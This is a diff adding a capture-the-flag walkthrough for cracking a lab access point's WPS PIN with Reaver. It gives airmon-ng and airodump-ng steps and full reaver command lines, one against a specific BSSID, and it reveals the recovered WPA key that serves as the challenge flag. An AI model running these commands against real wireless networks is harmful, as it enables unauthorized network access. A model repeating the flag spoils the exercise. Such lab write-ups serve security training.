@@ -1,0 +1,62 @@
+## Walkthrough (Using Reaver):
+
+### Step 1: Put Your Interface in Monitor Mode
+
+Make sure your wireless adapter supports monitor mode:
+
+```bash
+sudo airmon-ng check kill
+sudo airmon-ng start wlan1
+```
+
+### Step 2: Confirm the Target AP and Channel
+
+Use `airodump-ng` to identify the BSSID and channel:
+
+```bash
+sudo airodump-ng wlan1mon
+```
+
+Note the `BSSID` and `Channel` of the `CTF_WPS_AP`.
+
+### Step 3: Start the Reaver Attack
+
+Execute the Reaver attack, explicitly using the provided or guessed PIN (`12345670` is common for testing):
+
+```bash
+sudo reaver -i wlan1mon -b <TARGET_BSSID> -c <TARGET_CHANNEL> -p 12345670 --no-nacks --ignore-locks -vv
+```
+
+Replace `<TARGET_BSSID>` and `<TARGET_CHANNEL>` with actual values observed.
+
+### Step 4: Capture the WPA2 PSK
+
+After successful completion, Reaver will show:
+
+```
+[+] WPS PIN: '12345670'
+[+] WPA PSK: 'supersecretpassword'
+```
+
+### Step 5: Submit the PSK
+
+Submit `supersecretpassword` as your flag to solve the challenge!
+
+**Flag Format:**
+
+```
+supersecretpassword
+```
+
+
+or do:
+```
+sudo reaver \
+  -i wlan0mon \
+  -b D8:3A:DD:02:16:5A \
+  -p 12345670 \
+  --no-nacks \
+  --ignore-locks \
+  -vv
+  
+````
